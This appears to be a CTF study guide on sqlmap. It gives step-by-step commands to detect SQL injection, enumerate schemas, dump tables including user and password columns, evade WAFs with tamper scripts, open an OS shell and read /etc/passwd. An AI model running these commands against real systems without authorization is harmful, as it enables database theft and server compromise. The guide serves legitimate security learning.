# sqlmap: Step-by-Step Guide

Workflow for using sqlmap on a web challenge, from detection to dumping the flag. Concepts in
`1. Fundamentos e Quando Usar.md`.

## 0. Install

```bash
sudo pacman -S sqlmap          # Arch
# or: pip install sqlmap ; or: apt install sqlmap
```

## 1. Capture the right request

The best path: save the real request (Burp → "Copy to file", or DevTools → "Copy as cURL"):
```bash
# req.txt file with the complete HTTP request (method, headers, cookies, body)
sqlmap -r req.txt --batch
```
A simple GET directly from the URL:
```bash
sqlmap -u "https://target/item?id=1" --batch
```
Mark the explicit injection point with `*` when needed (e.g. inside a header/URL):
```bash
sqlmap -u "https://target/item/1*" --batch
```

## 2. Detect and identify

```bash
sqlmap -r req.txt --batch                 # detects injection + DBMS
sqlmap -r req.txt -p id --batch           # focus on a specific parameter (-p)
```
Raise the effort if it doesn't find it on the first try:
```bash
sqlmap -r req.txt --batch --level=5 --risk=3
```
`--level` widens where it tests (headers, cookies); `--risk` enables heavier payloads.

## 3. Enumerate the schema

```bash
sqlmap -r req.txt --batch --dbs                          # list databases
sqlmap -r req.txt --batch -D <database> --tables         # tables in the database
sqlmap -r req.txt --batch -D <database> -T <table> --columns
```

## 4. Extract the data / the flag

```bash
sqlmap -r req.txt --batch -D <database> -T <table> --dump        # dump the whole table
sqlmap -r req.txt --batch -D <database> -T users -C user,pass --dump # specific columns
sqlmap -r req.txt --batch --sql-query="SELECT flag FROM secret"  # direct query
```
A broad sweep for the flag when you don't know where it is:
```bash
sqlmap -r req.txt --batch --search -C flag          # look for a column named "flag"
```

## 5. WAF / filter: tamper scripts

If the injection is blocked by a filter, use tampers (they obfuscate the payload):
```bash
sqlmap -r req.txt --batch --tamper=space2comment,between
sqlmap --list-tampers                               # see what's available
```
Common cases: `space2comment` (spaces become `/**/`), `charencode`, `randomcase` (defeats a
case-sensitive filter).

## 6. Speed it up (timed competition)

```bash
sqlmap -r req.txt --batch --threads=10              # parallelize (mind the rate limit)
sqlmap -r req.txt --batch --technique=BEU           # restrict techniques (B/E/U) if you know the type
```

## 7. Shell (when the DBMS/privileges allow)

```bash
sqlmap -r req.txt --batch --os-shell               # OS shell (needs write permission)
sqlmap -r req.txt --batch --file-read=/etc/passwd  # read a file from the server
```
